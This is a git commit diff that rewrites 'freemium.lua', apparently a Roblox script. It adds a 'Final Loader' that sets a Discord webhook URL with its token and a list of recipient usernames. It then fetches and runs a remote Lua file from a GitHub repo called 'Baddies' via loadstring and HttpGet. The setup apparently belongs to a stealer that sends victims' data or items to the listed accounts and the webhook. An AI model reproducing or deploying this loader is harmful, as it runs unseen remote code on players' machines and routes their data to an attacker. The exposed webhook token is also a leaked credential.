098b418e5ed340a94572af1d422f3ff6923e5461
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 14:46:20 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,1 +1,10 @@
-https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA
+-- Final Loader
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA"  -- change this to your new one if you want
+
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalt048", "x"}
+
+_G.PING_POOR = true
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
+end)
